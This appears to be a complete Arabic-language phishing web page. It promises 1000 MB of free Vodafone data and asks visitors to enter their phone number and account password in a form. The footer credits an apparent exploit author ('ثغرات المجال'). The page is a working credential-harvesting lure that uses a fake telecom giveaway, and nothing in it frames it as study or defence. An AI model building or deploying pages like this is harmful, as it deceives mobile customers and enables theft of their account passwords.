<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عرض 1000 ميجا</title>
    <style>
        @import url( https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap );
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family:  Tajawal , sans-serif;
        }
        
        body {
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        @keyframes gradient {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 500px;
            text-align: center;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        h1 {
            color: #e60000;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 28px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
            background: rgba(255, 255, 255, 0.8);
        }
        
        input:focus {
            border-color: #e60000;
            outline: none;
            box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.2);
        }
        
        button {
            background: linear-gradient(to right, #e60000, #c50000);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
        }
        
        .message {
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
        }
        
        .success {
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #a5d6a7;
        }
        
        .error {
            background: #ffebee;
            color: #d32f2f;
            border: 1px solid #ef9a9a;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        
        .offer-badge {
            background: #e60000;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            display: inline-block;
            margin-bottom: 20px;
            font-weight: 500;
            box-shadow: 0 4px 8px rgba(230, 0, 0, 0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="offer-badge">عرض حصري=𓄂𝑹𝑶𝑵𝒀ᬽ</div>
        <h1>1000ميجا ببلاش</h1>
        <p>احصل على 1000 ميجا فودافون مجاناً!</p>
        
        <form method="post">
            <div class="form-group">
                <label for="number">🦅😊:</label>
                <input type="text" id="number" name="number" placeholder="أدخل رقمك" required>
            </div>
            
            <div class="form-group">
                <label for="password">كلمة المرور:</label>
                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
            </div>
            
            <button type="submit">احصل على العرض الآن</button>
        </form>
        
                
        <div class="footer">
            <p>العرض مرة واحده فقط حاليا</p>
            <p>ثغرات المجال د/رونــي البــحيره</p>
        </div>
    </div>
</body>
</html>
